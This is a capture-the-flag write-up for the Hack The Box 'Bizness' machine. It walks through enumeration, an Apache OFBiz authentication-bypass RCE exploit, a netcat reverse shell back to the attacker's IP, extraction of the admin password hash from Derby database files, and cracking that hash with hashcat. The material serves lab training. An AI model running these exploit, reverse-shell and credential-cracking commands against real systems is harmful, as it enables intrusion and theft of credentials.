<div class="banner">
    <div class="ads">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6"><path stroke-linecap="round" stroke-linejoin="round" d="M12 12.75c1.148 0 2.278.08 3.383.237 1.037.146 1.866.966 1.866 2.013 0 3.728-2.35 6.75-5.25 6.75S6.75 18.728 6.75 15c0-1.046.83-1.867 1.866-2.013A24.204 24.204 0 0 1 12 12.75Zm0 0c2.883 0 5.647.508 8.207 1.44a23.91 23.91 0 0 1-1.152 6.06M12 12.75c-2.883 0-5.647.508-8.208 1.44.125 2.104.52 4.136 1.153 6.06M12 12.75a2.25 2.25 0 0 0 2.248-2.354M12 12.75a2.25 2.25 0 0 1-2.248-2.354M12 8.25c.995 0 1.971-.08 2.922-.236.403-.066.74-.358.795-.762a3.778 3.778 0 0 0-.399-2.25M12 8.25c-.995 0-1.97-.08-2.922-.236-.402-.066-.74-.358-.795-.762a3.734 3.734 0 0 1 .4-2.253M12 8.25a2.25 2.25 0 0 0-2.248 2.146M12 8.25a2.25 2.25 0 0 1 2.248 2.146M8.683 5a6.032 6.032 0 0 1-1.155-1.002c.07-.63.27-1.222.574-1.747m.581 2.749A3.75 3.75 0 0 1 15.318 5m0 0c.427-.283.815-.62 1.155-.999a4.471 4.471 0 0 0-.575-1.752M4.921 6a24.048 24.048 0 0 0-.392 3.314c1.668.546 3.416.914 5.223 1.082M19.08 6c.205 1.08.337 2.187.392 3.314a23.882 23.882 0 0 1-5.223 1.082" /></svg>
        Offensive Security
    </div>
    <h1>
        <span>Vishok - Hacking Pentesting</span>
        Bizness HTB Writeup
    </h1>
</div>

####
####
####
## Open ports in target machine
### Nmap:
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

###### Nmap Scan
> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```
####
####
####
## Services that are running in the target machine
### HTTPS
The machine redirects to the *HTTPS* service, but the web page is blank, with no login or registration sections, so we will perform enumeration to find more things. Although the service has a self-signed certificate, enumeration tools like **gobuster** do not allow enumeration without specific parameters.
####
```ruby
gobuster dir -u 'https://bizness.htb/' -w /usr/share/wordlists/dictionary/web-content/directory-list-lowercase-2.3-medium.txt -t 150 -b 404,302 -k
```
####
- ##### Gobuster Param
    - `dir` Directory discovery after the `/`
    - `-u` Specifies the host URL
    - `-w` Specifies the path to a directory wordlist to test
    - `-t` Number of tasks sent in parallel
    - `-b` Hides output for the specified status codes
    - `-k` Bypasses SSL certificate errors

####
Gobuster reports the following: `/control (Status: 200) [Size: 34633]`.
####
At first, we see an error message because it is a root directory, which itself does not show information, but inside it, there is more information. So, we could do enumeration, but this time within the `/control` directory or search online if **apache.ofbiz** has admin routes.
####
```cs
000000061:   200        179 L    580 W      10756 Ch    "help"                        
000000053:   200        185 L    598 W      11060 Ch    "login"
000000138:   200        140 L    496 W      9308  Ch    "view"
000000077:   200        140 L    496 W      9308  Ch    "main"
```
####
For the first two, we cannot see their contents because we do not have permissions, so we are left with the other two. If we go to `/login`, in the footer we see a version: [*Apache Ofbiz 18.12*], so if we look for exploits or vulnerabilities related to this version, we will find some: [OFBiz-Authentication-Bypass-RCE](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)
####
The exploit is executed as follows:
####
```bash
python3 exploit.py --url https://bizness.htb --cmd 'id'
```
####
But this vulnerability is not designed to show the output of commands in the console or browser, so the execution of commands is blind. To check if they are really being executed, we will listen with **tcpdump** on the **tun0** interface to capture *ICMP* traces.
####
```bash
sudo tcpdump -i tun0 icmp
```
####
- #### Tcpdump Param
- `-i` Specifies the interface to intercept traffic
- `-icmp` Captures only ICMP traffic via **ping** |
####
If we run the exploit as follows, we will see a connection in tcpdump:
####
```perl
Request ->
python3 exploit.py --url https://bizness.htb --cmd 'ping -c 10.10.16.6'

Response ->
01:40:26.836894 IP bizness.htb > 10.10.16.6: ICMP echo request, id 8834, seq 1, length 64
01:40:26.836922 IP 10.10.16.6 > bizness.htb: ICMP echo reply, id 8834, seq 1, length 64
```
####
####
####
## First exploitation phase
### Netcat
The machine has a very important aspect to consider: **One-liners** with **bash** or **sh** do not work, so we have to try something different. We will use the following command:
####
```bash
python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.16.6 443'
```
####
This access is not adequate because it does not give us a fully interactive shell, so we will have to treat the **tty** before proceeding with privilege escalation. This process is called: **tty treatment**.
####
```bash
1. script -c bash /dev/null
2. ctrl + z
3. stty raw -echo; fg
4. 	  reset xterm
5. export TERM=xterm
```
####
####
####
## Second exploit phase (Privilage Escalation)
### Apache Ofbiz
We are not in the **sudoers** group, there are no *SUID* permissions, nor capabilities. However, inside `/opt` there is the `ofbiz` directory, which is the root where the Apache **ofbiz** service is running. Inside, there is a directory tree: `/opt/ofbiz/framework/resources/templates`. It seems to have **.xml** files with information about the admin user. There is a very interesting one called: **AdminUserLoginData.xml**. It seems to have relevant information about administrator authentication, so we could read the file and see what it contains.
####
```xml
<entity-engine-xml>
    <UserLogin 
	    userLoginId="@userLoginId@"
	    currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a"
	    requirePasswordChange="Y"
```
####
We see what could be the hash of a password encoded with *SHA*, but this hash is not crackable because it is missing the **Salt**. Our task will be to continue searching for more information to complete that hash. In the `/opt/ofbiz/runtime/data` directory, there is a directory called `/derby`. Investigating this, we find that **Derby** is a different kind of database, its structure is organized in directories and files, so if we go into that directory we will find all the database information in files. These are found inside `/seg0`.
####
<div class="info">

###### Derby DB Information
> To use Derby, you can download it from the official Apache Derby page and configure the CLASSPATH to include the necessary jar files, such as **derby.jar** and **derbytools.jar**. Once configured, you can use the `ij` utility to create and manage databases by running SQL commands.
</div>

####
There are many files, so filtering will help us find information faster. We know *SHA* is used and the field appears to be **currentPassword**, so we will filter to find this information more quickly:
####
```bash
strings -f ./seg0/* | grep currentPassword
```
####
- ##### Strings Param
- `-f` Shows the filename as output
####
```xml
./c1590.dat: 1Order sub-total X since beginning of current year
./c1c70.dat: 1Order sub-total X since beginning of current year
./c54d0.dat:                 
	<eeval-UserLogin 
		createdStamp="2023-12-16 03:40:23.643" 
		createdTxStamp="2023-12-16 03:40:23.445" 
		currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" 
		enabled="Y" 
		hasLoggedOut="N"
		lastUpdatedStamp="2023-12-16 03:44:54.272"
		lastUpdatedTxStamp="2023-12-16 03:44:54.213" 
		requirePasswordChange="N" 
		userLoginId="admin"
	/>
./c6010.dat: 'index.weight.WorkEffort.currentStatusId
./c6010.dat: +Index weight for WorkEffort.currentStatusId
./c6021.dat: 'index.weight.WorkEffort.currentStatusId
./c6190.dat: K8hours/days, currently the Re-Order Process convert day to mms with 8h/days
./c6550.dat: Amphere - Electric current
```
####
####
####
### SHA
This new password is still not valid, so we need to look for how it is encrypted. Searching, we find the following: `/opt/ofbiz/framework/base/src/main/java/org/apache/ofbiz/base/crypto`, this directory seems to contain all the code used to encrypt the password. First, we find this:
####
```java
private static boolean doComparePosix(String crypted, String defaultCrypt, byte[] bytes) {
    String salt = crypted.substring(typeEnd + 1, saltEnd);
    String hashed = crypted.substring(saltEnd + 1);
}
```
####
If we translate this to **Java** code to run it:
####
```java
public class Main {
    public static void main(String[] args) {
        String password = "$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I";
        doComparePosix(password);
    }

    private static boolean doComparePosix(String crypted) {
        int typeEnd = crypted.indexOf("$", 1);
        int saltEnd = crypted.indexOf("$", typeEnd + 1);
        String hashType = crypted.substring(1, typeEnd);
        String salt = crypted.substring(typeEnd + 1, saltEnd);
        String hashed = crypted.substring(saltEnd + 1);

        System.out.println(salt);
        System.out.println(hashed);
        
        return true;
    }
}
```
####
This prints in the terminal:
####
```perl
d
uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```
####
If we look more closely at that file, we find the following method: **encodeBase64URLSafeString**, which apparently consists of replacing the symbols: `+ /` with `- _`. So, if in the previous code at line 12 we add a `replace`, we should get a much cleaner hash:
####
```python3
String hashed = crypted.substring(saltEnd + 1).replace("_", "/").replace("-", "+");
```
####
From what we have seen, the hash is encoded in **base64**, so let's create a Python script to decode this hash, first decoding in base64 and then converting to hexadecimal, because we get **bytes** and that is not the structure of a hash.
####
```python
import base64

def main():
    hashed = 'uP0/QaVBpDWFeo8+dRzDqRwXQ2I='
    decode_hashed = base64.b64decode(hashed)

    print(decode_hashed.hex())

if __name__ == '__main__':
    main()
```
####
It is necessary to add a **=** at the end of the hash, otherwise it will say: *Incorrect padding*. Remember that base64 encoding adds equal signs at the end to complete the padding and thus be a multiple of *4*. That gives us as a result: `b8fd3f41a541a435857a8f3e751cc3a91c174362`.
####
We could try to crack it, but remember it is missing the **salt**, which we discovered is the letter **d**. So, we will save the hash in a file in the following format: `b8fd3f41a541a435857a8f3e751cc3a91c174362:d`.
####
The final step is to use hashcat to try to crack the hash:
####
```bash
hashcat -a 0 -m 120 hash /usr/share/wordlists/dictionary/rockyou.txt
```
####
- ##### Hashcat Param
- `-a` Specifies brute force attacks
- `-m` Specifies the mode to use to crack the hash
####
The password for the **root** user is: `monkeybizness`.